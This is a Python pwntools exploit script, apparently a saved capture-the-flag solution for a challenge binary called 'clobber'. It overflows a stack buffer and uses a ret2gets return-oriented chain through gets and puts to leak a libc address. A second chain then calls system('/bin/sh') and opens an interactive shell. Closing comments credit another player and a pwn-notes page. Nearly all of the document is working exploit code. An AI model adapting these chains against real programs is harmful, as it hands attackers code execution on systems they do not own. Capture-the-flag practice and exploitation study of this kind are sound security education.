#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
elf = ELF("./clobber")
libc = elf.libc
context.binary = elf
context.terminal = ["ghostty", "-e"]

p = elf.process()
#p = elf.debug(gdbscript="")
#p = remote("clobber.umbccd.net", 13373)

payload = b"a" * 0x20
payload += p64(0x0)
payload += p64(elf.plt["gets"])
payload += p64(elf.plt["gets"])
payload += p64(elf.plt["gets"])
payload += p64(elf.plt["puts"])
payload += p64(elf.sym["main"])
p.sendline(payload)

# ret2gets libc leak:
# these 3 gets are about creating non-null padding up to owner in _IO_lock_t
# this means that when we do puts((_IO_lock_t*)RDI) we'll get a libc leak

# typedef struct {
#     int lock;
#     int cnt;
#     void *owner;
# } _IO_lock_t;

p.sendline(b"\x01")
p.sendline(p32(0x0) + b"A" * 4 + b"B" * 8)
p.sendline(b"CCCC")

p.recvline()
p.recv(8)
tls = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = tls + 0x28c0

payload = b"a" * 0x28
payload += p64(next(libc.search(asm("pop rdi; ret;"), executable=True)))
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym["system"])

p.sendline(payload)

p.interactive()

# note: did not solve this during the ctf i'm just saving the writeup for next time
# credit for this writeup to tudor
# https://discord.com/channels/805891872853459037/1227791191559376947/1363560022792998932
# additional notes: https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets
